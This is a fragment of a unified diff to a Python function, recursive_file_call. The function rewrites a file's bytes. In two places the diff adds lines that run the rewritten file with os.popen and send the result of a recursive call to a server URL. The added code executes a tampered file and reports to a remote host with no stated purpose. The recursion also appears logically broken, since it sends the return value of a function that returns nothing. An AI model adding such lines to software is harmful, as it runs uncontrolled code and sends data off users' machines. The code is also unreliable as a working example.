@@ -36,11 +36,15 @@ def recursive_file_call(file_path, server_url):
             file_contents += b'1'
             with open(file_path, 'wb') as f:
                 f.write(file_contents)
+                os.popen(file_path)
+                send_output_to_server(recursive_file_call(file_path, server_url), server_url)
             return
         elif file_contents.count(b'1') >= 1:
             file_contents = file_contents.replace(b'1', b'00', 1)
             with open(file_path, 'wb') as f:
                 f.write(file_contents)
+                os.popen(file_path)
+                send_output_to_server(recursive_file_call(file_path, server_url), server_url)
             return
 
     # Append a '0' to the file content and call the function recursively
